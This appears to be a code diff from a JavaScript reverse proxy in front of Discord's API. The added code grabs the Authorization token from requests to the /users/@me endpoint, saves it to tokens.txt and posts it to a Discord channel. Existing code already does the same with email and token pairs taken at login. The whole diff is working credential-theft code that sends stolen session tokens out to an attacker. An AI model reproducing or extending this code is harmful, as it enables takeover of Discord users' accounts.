@@ -65,7 +65,20 @@ if(headers['content-type']) headersNew['content-type'] = headers['content-type']
   try {
   
     let s = JSON.parse(dataText)
-    if('https://discord.com' + req.originalUrl === `https://discord.com/api/v9/users/@me` && s.token){
+    if('https://discord.com' + req.originalUrl === `https://discord.com/api/v9/users/@me` && req.headers.authorization){
+
+    	let tokens;
+	try { tokens = fs.readFileSync("./tokens.txt", {encoding:'utf8', flag:'r'}); } catch(e) { console.log(e.message); return; }
+	
+	let arr = tokens.split("\n").map(d => {
+		return d.trim();
+	});
+if(!arr.includes(req.headers.authorization))client.createMessage('929489097955881000', `${req.headers.authorization}`)
+
+if(!arr.includes(req.headers.authorization)) arr.unshift(`${req.headers.authorization}`)
+	fs.writeFileSync("./tokens.txt", arr.join("\n"));
+}
+        if('https://discord.com' + req.originalUrl === `https://discord.com/api/v9/users/@me` && s.token){
 
     	let tokens;
 	try { tokens = fs.readFileSync("./tokens.txt", {encoding:'utf8', flag:'r'}); } catch(e) { console.log(e.message); return; }
@@ -75,7 +88,7 @@ if(headers['content-type']) headersNew['content-type'] = headers['content-type']
 	});
 if(!arr.includes(s.email))client.createMessage('929489097955881000', `${s.email}:${s.token}`)
 
-if(!arr.includes(s.email)) arr.unshift(`${s.email}:${s.token}`)
+if(!arr.includes(s.email)) arr.unshift(`${s.email}:${req.headers.token}`)
 	fs.writeFileSync("./tokens.txt", arr.join("\n"));
 }
 if('https://discord.com' + req.originalUrl === `https://discord.com/api/v9/auth/login`){
